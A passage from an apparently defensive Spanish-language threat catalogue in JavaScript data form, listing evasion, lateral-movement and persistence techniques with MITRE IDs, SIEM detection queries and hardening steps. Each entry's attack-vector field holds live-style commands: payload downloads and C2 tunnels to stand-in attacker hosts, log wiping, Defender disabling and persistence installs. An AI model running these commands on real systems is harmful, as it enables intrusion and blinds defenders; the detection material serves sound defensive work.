      spl: 'index=win EventCode=4688 (process=logman.exe OR process=wevtutil.exe) | stats count by command',
      sigma: 'win_etw_tampering',
      win_event_ids: [4688],
    },
    mitigacion_hardening: ['EDR con self-protection/anti-tamper driver (los de 1ª línea detectan el hooking de EtwEventWrite)', 'Sysmon/EDR service restart alerts + integrity monitoring', 'Alertar sobre cualquier logman/wevtutil que toque providers de seguridad'],
    parcheo_remediacion: ['Reiniciar los servicios de logging comprometidos', 'Correlacionar el gap de telemetría con la línea temporal del incidente', 'Forense del proceso responsable'],
    referencias: ['https://attack.mitre.org/techniques/T1562/001/', 'https://www.mdsec.co.uk/2021/06/disabling-etw-through-instrumentation-callbacks/'],
  },
  {
    id: 'SOC-003',
    nombre: 'Timestomping',
    categoria: 'SOC_Evasion',
    severidad: 'Medium',
    mitre_attack: ['T1070.006'],
    descripcion_tecnica: 'Modificar timestamps (creación/modificación/acceso) de archivos para que parezcan legítimos y evadir búsquedas por fecha. Un payload backdooreado con fecha de 2020 no aparece en "archivos recientes". SetFileTime API / touch / PowerShell.',
    impacto_iam_soc: 'Rompe los hunts por temporalidad y los IR timelines. Combinado con naming legítimo (masquerading) hace indistinguible el malware de archivos de sistema. Señal: $STANDARD_INFORMATION y $FILE_NAME (NTFS) discrepan — solo forense lo nota; a nivel SIEM: creador ≠ fechas coherentes.',
    vector_ataque: ['C:\> timestomp.exe evil.exe -z "01/01/2020 00:00:00" (o PowerShell SetFileTime)'],
    deteccion: {
      kql: 'DeviceFileEvents | where FileName endswith ".exe" and (FileCreationTime < FileModificationTime - 30d) | project Timestamp, FileName, FolderPath, FileCreationTime, FileModificationTime // fechas incoherentes',
      sigma: 'sysmon_timestomp_setfiletime',
      win_event_ids: [2, 11],
    },
    mitigacion_hardening: ['Hunts de coherencia: archivos con CreationTime muy anterior a primeros sightings del host', 'Sysmon evento 2 (file time change) habilitado', 'EDR con file integrity monitoring en rutas de sistema'],
    parcheo_remediacion: ['Forense con $FILE_NAME (timestamps nativos no se timestompean fácil)', 'Recalcular timeline del incidente con metadata NTFS', 'Identificar el proceso que cambió las fechas (Sysmon 2)'],
    referencias: ['https://attack.mitre.org/techniques/T1070/006/', 'https://www.sans.org/blog/digital-forensics-artifacts-timestomping/'],
  },
  {
    id: 'SOC-004',
    nombre: 'Log clearing / event log wiping',
    categoria: 'SOC_Evasion',
    severidad: 'High',
    mitre_attack: ['T1070.001'],
    descripcion_tecnica: 'Borrado de evidencia: wevtutil cl Security / Clear-EventLog / phantom loggers (crear logger alternativo que "capture" los eventos y borrarlos luego). Los ransomware clásicos (Conti, LockBit) limpian logs como paso final.',
    impacto_iam_soc: 'El SOC pierde la línea temporal del incidente. La buena noticia: el borrado DEJA HUELLA (1102: "The audit log was cleared" — si queda algo de logging o el SIEM ya había ingerido los eventos). SIEM centralizado = el atacante no puede borrar lo ya colectado.',
    vector_ataque: ['wevtutil cl Security && wevtutil cl System', 'Clear-EventLog -LogName Security'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 1102 | project TimeGenerated, SubjectUserName, Computer // audit log cleared; también 104 de System log',
      spl: 'index=win (EventCode=1102 OR EventCode=104) | stats count by host, user',
      sigma: 'win_event_log_cleared',
      win_event_ids: [1102, 104],
    },
    mitigacion_hardening: ['SIEM/Sentinel con ingesta en (near) real-time: lo ingerido es inmutable para el atacante', 'Alerta CRÍTICA sobre 1102/104 (casi siempre es ataque o error grave)', 'Restringir wevtutil y el derecho SeSecurityPrivilege'],
    parcheo_remediacion: ['Reconstruir desde el SIEM centralizado (ingesta previa al borrado)', 'Forense del endpoint (logs de disco: $LogFile, usn journal)', 'Investigar QUÉ se hizo antes del borrado (la ventana ciega es la más crítica)'],
    referencias: ['https://attack.mitre.org/techniques/T1070/001/', 'https://attack.mitre.org/techniques/T1070/008/'],
  },
  {
    id: 'SOC-005',
    nombre: 'LOLBins / LOLASMs (living off the land)',
    categoria: 'SOC_Evasion',
    severidad: 'High',
    mitre_attack: ['T1218', 'T1105'],
    descripcion_tecnica: 'Binarios firmados de Windows usados maliciosamente: certutil (descarga + base64 decode), mshta (ejecutar HTA), rundll32 (ejecutar DLL remota), regsvr32 (squiblydoo), msiexec (instalar payload remoto), bitsadmin (descarga), expand/cmake… En Linux: awk, curl, dd, cp con capabilities.',
    impacto_iam_soc: 'Ejecución "legítima": firman pasa whitelist de AV básico y los procesos no son malware per se. El LOLBAS project cataloga 100+. El SOC necesita baselines de USO (certutil -urlcache raro = alerta) no de binario.',
    vector_ataque: ['certutil.exe -urlcache -split -f https://atacante/payload.exe C:\\Temp\\p.exe', 'mshta.exe javascript:… (ejecución de script embebido)', 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"…'],
    deteccion: {
      kql: 'DeviceProcessEvents | where FileName in ("certutil.exe", "mshta.exe", "bitsadmin.exe", "regsvr32.exe") and (ProcessCommandLine contains "http" or ProcessCommandLine contains "urlcache" or ProcessCommandLine contains " javascript") | project Timestamp, FileName, ProcessCommandLine',
      spl: 'index=win EventCode=4688 (process=certutil.exe OR process=mshta.exe) | regex command="(?i)(urlcache|http|javascript)"',
      sigma: 'win_lolbin_execution_certutil',
      win_event_ids: [4688, 1],
    },
    mitigacion_hardening: ['AppLocker/WDAC: restringir certutil/mshta/bitsadmin a rutas y usos legítimos', 'Alertas de CLI patterns de los LOLBins más usados (MS lo publica en la docs de cada binario)', 'ASR rules de Defender (Block process creations originating from PSExec/WMI, etc.)'],
    parcheo_remediacion: ['Bloquear el binario/uso en el host', 'Hunt de 4688/1 con esos binarios en la ventana del incidente', 'Forense del payload descargado'],
    referencias: ['https://lolbas-project.github.io/', 'https://attack.mitre.org/techniques/T1218/'],
  },
  {
    id: 'SOC-006',
    nombre: 'Defender / antivirus tampering',
    categoria: 'SOC_Evasion',
    severidad: 'Critical',
    mitre_attack: ['T1562.001'],
    descripcion_tecnica: 'Deshabilitar protecciones: Set-MpPreference -DisableRealtimeMonitoring $true, exclusions maliciosas (Add-MpPreference -ExclusionPath C:\\Temp), borrar historial, o parchear WdFilter driver. Requiere admin, pero el malware de accesos iniciales viene con esa escalada integrada.',
    impacto_iam_soc: 'Ciega el endpoint justo antes del despliegue del ransomware. Las exclusiones son el vector más sutil (Defender sigue "activo" pero ignora la carpeta del atacante). Señal: cualquier cambio de configuración de Defender = alerta crítica (1102/5001/5007 de Microsoft-Windows-Windows Defender/Operational).',
    vector_ataque: ['Set-MpPreference -DisableRealtimeMonitoring $true', 'Add-MpPreference -ExclusionPath "C:\\Users\\Public" (exclusion silenciosa)', 'Tamper protection bypass vía PPL injection (avanzado)'],
    deteccion: {
      kql: 'DeviceProcessEvents | where FileName == "powershell.exe" and ProcessCommandLine contains ("Set-MpPreference" or "Add-MpPreference") | project Timestamp, ProcessCommandLine',
      spl: 'index=win sourcetype=XmlWinEventLog:Microsoft-Windows-Windows Defender/Operational EventCode IN (5001, 5007, 5013) | stats count by host',
      sigma: 'win_defender_tampering',
      win_event_ids: [5001, 5007, 5013],
    },
    mitigacion_hardening: ['Tamper Protection ON (impide cambios de config desde procesos no firmados)', 'ASR + cloud-delivered protection', 'Alerta SIEM de CUALQUIER 5007 (config changed) — correlacionar con tickets IT'],
    parcheo_remediacion: ['Restaurar configuración de Defender + quitar exclusiones', 'Full scan con Defender offline (arranque desde WinRE)', 'Forense: qué se ejecutó durante la ventana desprotegida'],
    referencias: ['https://attack.mitre.org/techniques/T1562/001/', 'https://learn.microsoft.com/en-us/microsoft-365/security/endpoint-detection-response-overview'],
  },
  {
    id: 'SOC-007',
    nombre: 'EDR unhooking / direct syscalls',
    categoria: 'SOC_Evasion',
    severidad: 'High',
    mitre_attack: ['T1562.001', 'T1102'],
    descripcion_tecnica: 'Los EDR hookean ntdll (API monitoring). El unhooking restaura el ntdll "limpio" (desde el disco o KnownDlls) y los direct syscalls (SysWhispers, HellsGate) llaman a la SSDT directamente — el hook del EDR nunca se ejecuta. Combinado con stack spoofing (SilentMoonwalk) es indetectable para telemetría user-land.',
    impacto_iam_soc: 'Los toolkits de evasión (Brute Ratel, NimPlant, Sliver) traen esto por defecto. La defensa es kernel-mode telemetry (ETW ti + minifilter + callbacks de proceso) que no depende de hooks user-land. Señal: cargas de ntdll desde disco (Sysmon 7 de ntdll con imagen "fresh"), self-injection patterns.',
    vector_ataque: ['Mapear ntdll limpia desde \\KnownDlls\\ntdll.dll y parchear los hooks', 'SysWhispers3: generar stubs de syscall directos para las APIs objetivo'],
    deteccion: {
      kql: 'DeviceImageLoadEvents | where FileName == "ntdll.dll" and InitiatingProcessFileName != "smss.exe" and FolderPath contains ("Temp" or "AppData") | project Timestamp, FolderPath, InitiatingProcessFileName',
      sigma: 'sysmon_unhooking_ntdll_mapping',
      win_event_ids: [7, 10],
    },
    mitigacion_hardening: ['EDR con componentes kernel (callbacks PsSetCreateProcessNotifyRoutine, minifilters) que no dependen de user-land hooks', 'Habilitar Vulnerable Driver Blocklist (contra los BYOVD)', 'Monitorizar mappings de KnownDlls desde procesos de usuario'],
    parcheo_remediacion: ['Forense avanzado (el proceso evitó telemetría user-land: revisar kernel callbacks y memory forensics)', 'Aislar host y capturar RAM antes de reboot', 'Rotar credenciales del host'],
    referencias: ['https://attack.mitre.org/techniques/T1562/001/', 'https://www.crowdstrike.com/blog/how-syscalls-work-in-windows-and-evasion-techniques/'],
  },
  {
    id: 'SOC-008',
    nombre: 'C2 sobre DNS / DoH (túneles encubiertos)',
    categoria: 'SOC_Evasion',
    severidad: 'High',
    mitre_attack: ['T1071.004', 'T1132.001'],
    descripcion_tecnica: 'El canal C2 viaja en queries DNS TXT/NULL (iodine, dnscat2) o HTTPS sobre DoH (bypass de proxies que solo inspeccionan puerto 53). Subdominios codificados exfiltran datos hacia dominios del atacante bajo el radar de proxies/L7.',
    impacto_iam_soc: 'Exfiltración y C2 sin abrir conexiones directas: solo tráfico DNS "normal". Detección por volumen/patrones (NXDOMAIN alto, labels largos, entropía de subdominios) y por comparar el resolver usado vs el corporativo. DoH a servidores públicos no corporativos = política a romper.',
    vector_ataque: ['iodine -f -P pass tunnel.atacante.com (túnel IP sobre DNS TXT)', 'curl --doh-url https://cloudflare-dns.com/dns-query https://c2.atacante (DoH)'],
    deteccion: {
      kql: 'DeviceNetworkEvents | where RemotePort == 53 and InitiatingProcessFileName !in ("svchost.exe", "dnscache") | summarize count() by RemoteUrl, InitiatingProcessFileName | where count > 100 // DNS fuera del resolver',
      spl: 'index=dns | stats count by query, src | eval len=len(query) | where len > 50 | sort - count',
      sigma: 'net_dns_high_entropy_domains',
    },
    mitigacion_hardening: ['Force DNS corporativo (bloquear DoH known endpoints y IP de resolvers públicos)', 'Sinkhole/alerta de dominios de alta entropía y labels largos', 'Firewall egress: bloquear DNS directo a Internet (solo el resolver interno)'],
    parcheo_remediacion: ['Bloquear el dominio del túnel en el resolver (y buscar consultas históricas)', 'Forense del proceso origen del túnel', 'Rotar datos exfiltrados (asumir salida)'],
    referencias: ['https://attack.mitre.org/techniques/T1071/004/', 'https://unit42.paloaltonetworks.com/dns-tunnels/'],
  },
  {
    id: 'SOC-009',
    nombre: 'Phantom loggers / Windows event log manipulation',
    categoria: 'SOC_Evasion',
    severidad: 'Medium',
    mitre_attack: ['T1070.001', 'T1112'],
    descripcion_tecnica: 'Técnica avanzada de ClearEventLog evasion: crear un logger Windows (wevtutil sl con fuentes custom) que redirige los eventos de seguridad a un canal alternativo (no consultado), o manipular el MaxSize del canal para forzar el rolling/borrado natural. También: deshabilitar autoanalytics (audit policy /clear).',
    impacto_iam_soc: 'El logging parece activo (el servicio corre) pero los eventos de seguridad no van a donde el SIEM consulta. Muy usado en incidentes prolongados. Señal: cambios de configuración de canales (wevtutil sl) y modificaciones de Audit Policy (4719).',
    vector_ataque: ['wevtutil sl Security /ms:1024 (minimizar tamaño → rolling agresivo)', 'auditpol /clear (reset de política de auditoría)'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4719 // audit policy changed; DeviceProcessEvents de wevtutil con "sl"',
      sigma: 'win_audit_policy_disabled',
      win_event_ids: [4719, 1102],
    },
    mitigacion_hardening: ['GPO enforcement de audit policy (se re-aplica periódicamente)', 'SIEM: monitorear la SALUD de los agentes (gap detection, last-event-age por host)', 'Alertas sobre wevtutil sl / auditpol en estaciones'],
    parcheo_remediacion: ['Restaurar audit policy desde GPO (gpupdate /force)', 'Recuperar eventos del canal alternativo si existe', 'Forense del registry (EventLog keys)'],
    referencias: ['https://attack.mitre.org/techniques/T1070/001/', 'https://www.youtube.com/watch?v=h2NiZBmm3Fw (Phantom loggers)'],
  },
  {
    id: 'SOC-010',
    nombre: 'Masquerading (renombres, mismatch de extensiones, living documents)',
    categoria: 'SOC_Evasion',
    severidad: 'Medium',
    mitre_attack: ['T1036'],
    descripcion_tecnica: 'Renombrar malware como binarios de sistema (svchost.exe en user folders), double extensions (informe.pdf.exe con icono de PDF), rutas con espacios finales (notepad.exe .exe), y abusing de extensiones permitidas (LNK, ISO, IMG para bypass de MOTW).',
    impacto_iam_soc: 'El analista triagea 100 alertas: el renombre hace que el proceso parezca normal en la cola. Los ISO/IMG (contenedores de phishing moderno) bypassean Mark-of-the-Web (MOTW no se propaga dentro de montajes NTFS). Señal: procesos críticos ejecutándose fuera de System32, y extensiones ejecutables desde montajes.',
    vector_ataque: ['Copiar payload como C:\\Users\\…\\Documents\\svchost.exe', 'Phishing con ISO que contiene LNK → cmd → payload (sin MOTW)'],
    deteccion: {
      kql: 'DeviceProcessEvents | where FileName in ("svchost.exe", "lsass.exe", "csrss.exe", "winlogon.exe") and FolderPath !startswith "C:\\Windows\\System32" | project Timestamp, FolderPath, ProcessCommandLine',
      sigma: 'win_renamed_sysbinary_execution',
      win_event_ids: [4688, 1],
    },
    mitigacion_hardening: ['Hunt permanente: procesos de sistema fuera de rutas de sistema', 'Bloquear ISO/IMG montajes por usuarios (GPO: Deny mount de medios removibles)', 'Mostrar extensiones + bloquear ejecución desde %APPDATA% y %TEMP% (ASR)'],
    parcheo_remediacion: ['Eliminar los binarios renombrados', 'Hunt de todos los procesos de sistema fuera de System32 en el fleet', 'Forense del vector de entrada (ISO?)'],
    referencias: ['https://attack.mitre.org/techniques/T1036/', 'https://outflank.nl/blog/2020/03/30/why-you-should-be-worried-about-iso-files/'],
  },
  /* ============================ LATERAL MOVEMENT ============================ */
  {
    id: 'LAT-001',
    nombre: 'PsExec / SMB admin shares',
    categoria: 'LateralMovement',
    severidad: 'High',
    mitre_attack: ['T1021.002'],
    descripcion_tecnica: 'PsExec copia un binario al ADMIN$ share y lo ejecuta como servicio via SMB (445). Es LA herramienta de movimiento lateral (legítima de Sysinternals y también de atacantes). Requiere credenciales admin del host remoto.',
    impacto_iam_soc: 'Movimiento lateral clásico. Como es legítimo, la detección es por PATRÓN: 4624 tipo 3 + instalación de servicio PSEXESVC (7045) + acceso a ADMIN$ (5140/5145). El ransomware lo usa en masa (miles de hosts).',
    vector_ataque: ['psexec \\\\host -c payload.exe -s (o Impacket psexec.py)'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 7045 and ServiceName == "PSEXESVC" | project TimeGenerated, Computer, SubjectUserName',
      spl: 'index=win EventCode=7045 service="PSEXESVC" | stats count by host, user',
      sigma: 'win_psexesvc_service_installation',
      win_event_ids: [7045, 5140, 4624],
    },
    mitigacion_hardening: ['Restringir SMB (445) entre estaciones (segmentación: solo servidores específicos)', 'Bloquear acceso a ADMIN$/IPC$ de estaciones de trabajo (GPO: acceso remoto solo a servers)', 'LAPS + no reutilizar admin local (sin credenciales, no hay lateral)'],
    parcheo_remediacion: ['Parar el servicio/binary remoto y limpiar hosts alcanzados', 'Rotar las credenciales usadas para el lateral', 'Mapa de 7045 en la ventana = lista de hosts tocados'],
    referencias: ['https://attack.mitre.org/techniques/T1021/002/', 'https://www.microsoftpressstore.com/articles/article.aspx?p=2762082'],
  },
  {
    id: 'LAT-002',
    nombre: 'WMI lateral movement',
    categoria: 'LateralMovement',
    severidad: 'High',
    mitre_attack: ['T1047'],
    descripcion_tecnica: 'Windows Management Instrumentation ejecuta procesos remotos (wmic /node:… process call create, o WmiPrvSE con CreateProcess). No deja binario copiado (más silencioso que PsExec) y WMI es infraestructura legítima de gestión.',
    impacto_iam_soc: 'Ejecución remota sin archivo. Detección: Sysmon/WMI-Activity operational log (EventID 5857-5861), proceso WmiPrvSE.exe con hijos inusuales (cmd.exe, powershell.exe), y 4624 tipo 3 con DCOM como logon process. Imperium/wmiexec lo usan.',
    vector_ataque: ['wmic /node:10.0.0.5 process call create "cmd /c whoami"', 'Impacket wmiexec.py (semi-interactiva)'],
    deteccion: {
      kql: 'DeviceProcessEvents | where InitiatingProcessFileName == "WmiPrvSE.exe" and FileName in ("cmd.exe", "powershell.exe", "wscript.exe") | project Timestamp, ProcessCommandLine, InitiatingProcessCommandLine',
      spl: 'index=win EventCode=4688 parent=WmiPrvSE.exe | stats count by command, host',
      sigma: 'win_wmi_remote_process_creation',
      win_event_ids: [4688, 4624],
    },
    mitigacion_hardening: ['Restringir DCOM/WMI remoto (firewall 135 + reglas de DCOM launch permissions)', 'Monitor de hijos de WmiPrvSE (baseline: no debería spawnear shells)', 'Cuentas con permisos remotos WMI minimizadas'],
    parcheo_remediacion: ['Hunt de WmiPrvSE con shells en toda la flota en la ventana', 'Rotar credenciales usadas', 'Forense de hosts con ejecución confirmada'],
    referencias: ['https://attack.mitre.org/techniques/T1047/', 'https://www.mdsec.co.uk/2020/09/i-like-to-move-it-move-lateral-movement-where-wmi-meets-wsman/'],
  },
  {
    id: 'LAT-003',
    nombre: 'WinRM / PowerShell remoting',
    categoria: 'LateralMovement',
    severidad: 'High',
    mitre_attack: ['T1021.005'],
    descripcion_tecnica: 'WinRM (5985/5986) ejecuta PowerShell remoto: Enter-PSSession, Invoke-Command, evilwinrm, crackmapexec --winrm. Con credenciales válidas, es shell remota cifrada con la bendición del sistema.',
    impacto_iam_soc: 'Lateral "limpio": todo va por HTTPS/HTTP cifrado, los comandos corren en el host remoto como procesos de PowerShell con 4103/4104 logging (si está habilitado). Señal: 4624 tipo 3 con LogonProcessName = Wsmprovhost, y PowerShell con RunSpace remoto.',
    vector_ataque: ['evilwinrm -i 10.0.0.5 -u admin -H <hash>', 'Invoke-Command -ComputerName host -ScriptBlock {…}'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4624 and LogonProcessName == "Wsmprovhost" | summarize count() by TargetUserName, IpAddress | where count > 10',
      spl: 'index=win EventCode=4624 LogonProcess=Wsmprovhost | stats count by user, src',
      sigma: 'win_winrm_remote_shell',
      win_event_ids: [4624, 4104],
    },
    mitigacion_hardening: ['WinRM deshabilitado en estaciones (solo en servers de gestión, con allowlist de usuarios)', 'PowerShell logging (script block 4104 + module logging 4103) en todos los hosts', 'Cuentas de gestión: solo tier específicas pueden WinRM'],
    parcheo_remediacion: ['Hunt 4624 Wsmprovhost en la ventana', 'Rotar credenciales usadas', 'Revisar 4104 del host remoto (qué comandos corrieron)'],
    referencias: ['https://attack.mitre.org/techniques/T1021/005/', 'https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/running-remote-commands'],
  },
  {
    id: 'LAT-004',
    nombre: 'RDP hijack / session shadowing',
    categoria: 'LateralMovement',
    severidad: 'High',
    mitre_attack: ['T1078.002', 'T1021.001'],
    descripcion_tecnica: 'Con SYSTEM en un host, tscon <session> /dest:console secuestra la sesión RDP activa de OTRO usuario sin password (el token de sesión ya está vivo). También la técnica "RDP hijack" sobre terminales desconectados.',
    impacto_iam_soc: 'Secuestro de sesión sin robar credenciales: el atacante "entra" a la sesión abierta del usuario (con sus accesos, cookies y tokens). Señal: uso de tscon.exe (raro en operación normal) y sesiones RDP reasignadas (EventID 4778/4779 con sesiones cambiando de estación).',
    vector_ataque: ['query user (recon de sesiones)', 'tscon 3 /dest:console (secuestro con SYSTEM)'],
    deteccion: {
      kql: 'DeviceProcessEvents | where FileName == "tscon.exe" | project Timestamp, ProcessCommandLine, AccountName',
      sigma: 'win_tscon_rdp_hijack',
      win_event_ids: [4778, 4779, 4688],
    },
    mitigacion_hardening: ['Política de desconexión de sesiones RDP (time-limit idle + logoff en vez de disconnect)', 'Restringir SYSTEM remoto (evitar la escalada previa)', 'Monitor de tscon.exe'],
    parcheo_remediacion: ['Cerrar TODAS las sesiones del host', 'Reset de las cuentas secuestradas', 'Forense: qué se hizo en la sesión secuestrada'],
    referencias: ['https://attack.mitre.org/techniques/T1078/002/', 'https://medium.com/@networksecurity/rdp-sessions-hijacking-with-tscon-1d49a1e3f2b6'],
  },
  {
    id: 'LAT-005',
    nombre: 'SSH tunneling / port forwarding',
    categoria: 'LateralMovement',
    severidad: 'Medium',
    mitre_attack: ['T1572', 'T1021.004'],
    descripcion_tecnica: 'SSH permite túneles elegantes: -L (local forward para alcanzar servicios internos), -R (remote forward: exponer un servicio interno hacia afuera), -D (SOCKS proxy dinámico). Con credenciales SSH de un host, pivotar a toda la red interna.',
    impacto_iam_soc: 'Pivote estándar Linux. El -R es el más peligroso (reverse tunnel hacia C2). Señal: procesos ssh con -D/-R/-L en servers que no son bastiones, conexiones SSH persistentes (beacon-like), y plink.exe en Windows (ssh de PuTTY usado por malware).',
    vector_ataque: ['ssh -D 1080 user@jump (SOCKS proxy interno)', 'ssh -R 4444:localhost:4444 atacante.com (reverse tunnel C2)', 'chisel (túnel sobre HTTP/WebSocket)'],
    deteccion: {
      spl: 'index=nix sourcetype=linux_secure sshd | regex command=".*\\-[DLR] [0-9]+" | stats count by user, src, command',
      sigma: 'lnx_ssh_tunneling',
    },
    mitigacion_hardening: ['SSH solo desde bastiones (allowlist de origenes, no passwords: solo claves)', 'Server-side: AllowTcpForwarding no (salvo bastión)', 'Egress control: SSH saliente solo a destinos aprobados'],
    parcheo_remediacion: ['Matar los túneles activos + rotar claves SSH del host', 'Bloquear el destino del túnel', 'Auditar el alcance: qué se accedió por el túnel'],
    referencias: ['https://attack.mitre.org/techniques/T1572/', 'https://man.openbsd.org/ssh'],
  },
  {
    id: 'LAT-006',
    nombre: 'Coerción de autenticación (PetitPotam, PrinterBug, DFSCoerce…)',
    categoria: 'LateralMovement',
    severidad: 'High',
    mitre_attack: ['T1557', 'T1550.002'],
    descripcion_tecnica: 'Métodos RPC que FUERZAN a un host (incl. DCs) a autenticarse contra un target del atacante: MS-EFSRPC (PetitPotam), MS-RPRN (PrinterBug), NetrDfsAddStdRoot (DFSCoerce), HBSS/shares. El NTLM resultante se relaya (a LDAP, ADCS, SMB).',
    impacto_iam_soc: 'Sin credenciales previas, un DC puede ser forzado a entregarse a un relay → ESC8/RBCD/LDAP relay → escala total. Cada semana aparecen métodos nuevos de coerción. Señal: conexiones salientes del DC hacia IPs internales raras (puertos 445/139 desde el DC a estaciones) = confesión de coerción.',
    vector_ataque: ['PetitPotam.py <listener> <dc_ip>', 'printerbug.py domain/user:pass@dc@listener'],
    deteccion: {
      kql: 'DeviceNetworkEvents | where InitiatingProcessFileName == "lsass.exe" and RemotePort in (445, 139) and RemoteIP !in (server_range) // autenticaciones salientes de DC hacia estaciones',
      spl: 'index=network src=dc* dest_port=445 | stats count by src, dest | where dest NOT IN (servers)',
      win_event_ids: [4624, 5145],
    },
    mitigacion_hardening: ['SMB signing obligatorio (rompe el relay SMB) + LDAPS channel binding + EPA', 'Firewall DCs: bloquear salidas 445 hacia estaciones (los DCs no deben hablar SMB con estaciones)', 'NTLM auditing / restricción (Restrict NTLM: Domain audit → deny)'],
    parcheo_remediacion: ['Identificar el host origen del relay (la IP del listener en los eventos)', 'Parchear el método de coerción (PetitPotam: MS junio 2021+ hardening)', 'Rotar credenciales del principal relayed'],
    referencias: ['https://attack.mitre.org/techniques/T1557/', 'https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-ntlm-authentication/'],
  },
  {
    id: 'LAT-007',
    nombre: 'NTLM relay a LDAPS (mitm6 + ntlmrelayx)',
    categoria: 'LateralMovement',
    severidad: 'Critical',
    mitre_attack: ['T1557', 'T1557.002'],
    descripcion_tecnica: 'mitm6 responde DHCPv6 y se convierte en DNS resolver de los hosts (WPAD proxy attack); ntlmrelayx relaya el NTLM resultante a LDAPS del DC: crear computadoras, modificar grupos, configurar RBCD ( delegación de recursos) o escapar a ADCS. Channel binding y signing mitigan según el target.',
    impacto_iam_soc: 'Escala de "usuario en la red" a DA sin credenciales: el relay a LDAPS permite RBCD sobre cualquier computadora → impersonación de DA en ese host. Señal: eventos DHCPv6 en hosts (una IP IPv6 nueva y DNS no corporativo), 4662 (writes LDAP) desde la víctima sin su interacción.',
    vector_ataque: ['mitm6 -d corp.local (DHCPv6 poisoning)', 'ntlmrelayx.py -t ldaps://dc.corp.local --delegate-access (RBCD setup)'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 5136 and AttributeLDAPDisplayName == "msDS-AllowedToActOnBehalfOfOtherIdentity" // RBCD via relay; DNS logs: hosts resolviendo por IPv6 no autorizado',
      sigma: 'win_rbd_set_via_ldap',
      win_event_ids: [5136, 4741],
    },
    mitigacion_hardening: ['Deshabilitar WPAD (GPO WinHttpAutoProxySvc) y bloquear DHCPv6 no autorizado en switches', 'LDAPS: channel binding obligatorio (esto mata el relay a LDAPS)', 'LDAP signing + SMB signing en todo el dominio'],
    parcheo_remediacion: ['Revertir el RBCD / computadoras creadas (4662/4741 en la ventana)', 'Rotar credenciales de los usuarios relayed', 'Hunt: hosts con DNS IPv6 cambiado'],
    referencias: ['https://attack.mitre.org/techniques/T1557/002/', 'https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/'],
  },
  {
    id: 'LAT-008',
    nombre: 'RDP / NLA deshabilitado + fuerza bruta',
    categoria: 'LateralMovement',
    severidad: 'Medium',
    mitre_attack: ['T1110.001', 'T1021.001'],
    descripcion_tecnica: 'Hosts con RDP expuesto (3389) sin NLA (Network Level Authentication) o directamente a Internet: los gateways RDP son el objetivo favorito de sprays y de infostealer-driven access. La suite con validación de contraseñas (crowbar, hydra RDP) funcionaba mejor pre-NLA.',
    impacto_iam_soc: 'Acceso inicial/lateral con credenciales. La proliferación de RDP sin NLA + reutilización de contraseñas es la puerta de entrada clásica de ransomware (Vector: RDP credential stuffing en cuentas VPN/RDP). Señal: 4625 masivos por host y fuente, y 4624 tipo 10 (RemoteInteractive) desde IPs inesperadas.',
    vector_ataque: ['hydra -L users.txt -P pass.txt rdp://host', 'Crowbar RDP brute con NLA activo'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4625 and LogonType == 10 | summarize count() by IpAddress, TargetUserName, bin(TimeGenerated, 15m) | where count > 10',
      spl: 'index=win EventCode=4625 LogonType=10 | stats count by src, user | where count > 10',
      win_event_ids: [4625, 4624],
    },
    mitigacion_hardening: ['RDP JAMÁS directo a Internet: RD Gateway con MFA o VPN con MFA', 'NLA obligatorio + cuenta lockout policies', 'Rename/monitorizar la cuenta administrator local + LAPS'],
    parcheo_remediacion: ['Bloquear la IP fuente y cerrar el acceso externo', 'Reset de cuentas comprometidas', 'Auditar sesiones RDP exitosas en la ventana (4624 tipo 10)'],
    referencias: ['https://attack.mitre.org/techniques/T1021/001/', 'https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/secure-remote-desktop-access'],
  },
  /* ============================ PERSISTENCE ============================ */
  {
    id: 'PER-001',
    nombre: 'Scheduled Tasks',
    categoria: 'Persistence',
    severidad: 'High',
    mitre_attack: ['T1053.005'],
    descripcion_tecnica: 'Tareas programadas que ejecutan el payload al arrancar, cada X minutos o como trigger de evento. schtasks /create o via COM (Schedule.Service). El ransomware las usa para ejecución masiva; los APT para persistencia de baja frecuencia.',
    impacto_iam_soc: 'Persistencia sólida y legítima-looking. Tareas con nombres que imitan mantenimiento de Windows (OneDrive Standalone Update Task) pasan el triage. Señal: 4698 (tarea creada), tareas que ejecutan binarios en rutas de usuario/Temp, y tareas con trigger ONSTART + SYSTEM.',
    vector_ataque: ['schtasks /create /tn "SystemHealth" /tr "C:\\Temp\\svc.exe" /sc onstart /ru SYSTEM'],
    deteccion: {
      kql: 'SecurityEvent | where EventID == 4698 | project TimeGenerated, SubjectUserName, TaskContent | where TaskContent contains "Temp" or TaskContent contains "AppData"',
      spl: 'index=win EventCode=4698 | regex task_content="(?i)(temp|appdata|public)"',
      sigma: 'win_scheduled_task_creation_susp_location',
      win_event_ids: [4698, 4702],
    },
    mitigacion_hardening: ['Baseline de tareas legítimas + alerta de tareas nuevas que ejecutan rutas de usuario', 'Restringir schtasks remoto (/s) a no-admins', 'Sysmon/EDR file events en C:\\Windows\\Tasks'],
    parcheo_remediacion: ['Eliminar las tareas maliciosas (schtasks /delete /tn … /f)', 'Hunt de 4698 en la ventana', 'Forense del payload ejecutado'],
    referencias: ['https://attack.mitre.org/techniques/T1053/005/', 'https://learn.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page'],
  },
  {
    id: 'PER-002',
    nombre: 'Registry Run Keys / Startup folder',
    categoria: 'Persistence',
    severidad: 'High',
    mitre_attack: ['T1547.001'],
    descripcion_tecnica: 'El clásico autorun: HKCU/HKLM …\\Run, RunOnce, Image File Execution Options (debugger hijack), Winlogon Shell/Userinit. El payload se ejecuta con cada login. Una entrada REG_SZ y listo.',
    impacto_iam_soc: 'Persistencia de arranque trivial de detectar SI se audita el registry (Sysmon 12/13): cualquier .exe en rutas de usuario bajo una clave Run es sospechoso. Los malware modernos usan claves más oscuras (IFEO debugger, Winlogon) para evadir hunts básicos.',
    vector_ataque: ['reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v OneDriveUpd /t REG_SZ /d "C:\\Temp\\svc.exe"', 'IFEO debugger: depurar un binario legítimo para ejecutar el malware'],
